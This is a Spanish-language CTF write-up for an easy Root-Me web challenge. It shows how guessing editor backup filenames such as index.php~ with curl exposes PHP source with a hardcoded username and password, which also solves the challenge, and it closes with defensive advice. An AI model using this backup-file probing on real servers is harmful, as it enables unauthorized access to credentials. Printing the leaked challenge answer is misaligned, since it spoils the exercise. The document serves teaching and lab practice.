# file backup

**CTF:** [File Backup]
**Categoría:** [Web]
**Dificultad:** [Fácil]


## 🎯 Descripción y Objetivo
se nos entrega una pagina de login basica,antes de entrar al reto se nos
da el nombre de file backup,esto es una pista a archivos de respaldo
o archivos temporales
## 🔍 Reconocimiento, Análisis y explotacion
en primera instancia teniendo en cuenta la descripcion del reto
podemos empezar a fuzzear por archivos temporales [index.php] que terminen en
[ ~, .bak, .old, .swp, .svc] estos archivos en su mayoria son generados
por editores de codigo.


```bash
curl -L http://challenge01.root-me.org/web-serveur/ch11/index.php~
<?php

$username="ch11";
$password="OCCY9AcNm1tj";


echo '
      <html>
      <body>
        <h1>Authentication v 0.00</h1>
';

if ($_POST["username"]!="" && $_POST["password"]!=""){
    if ($_POST["username"]==$user && $_POST["password"]==$password)
    {
      print("<h2>Welcome back {$row['username']} !</h2>");
      print("<h3>Your informations :</h3><p>- username : $row[username]</p><br />");
      print("To validate the challenge use this password</b>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");

    }
}

echo '
        <form action="" method="post">
          Login&nbsp;<br/>
          <input type="text" name="username" /><br/><br/>
          Password&nbsp;<br/>
          <input type="password" name="password" /><br/><br/>
          <br/><br/>
          <input type="submit" value="connect" /><br/><br/>
        </form>
      </body>
      </html>
';

?>
```

con eso ya tendriamos las credenciales para loguearnos. Esta misma contraseña
es la que usamos para validar el reto

#analisis

esto es una vulnerabilidad del tipo information disclosure, apesar
de que el reto se diseño para esto,muchas veces estos archivos en
un entorno real son una fuente de informacion muy util

la mejor forma de evitar esa vulnerabilidad es validar que archivos fueron
subidos al servidor

tambien la de evitar el programar en un servidor de produccion,lo mejor
es programar de forma local y a produccion solo subir lo necesario.

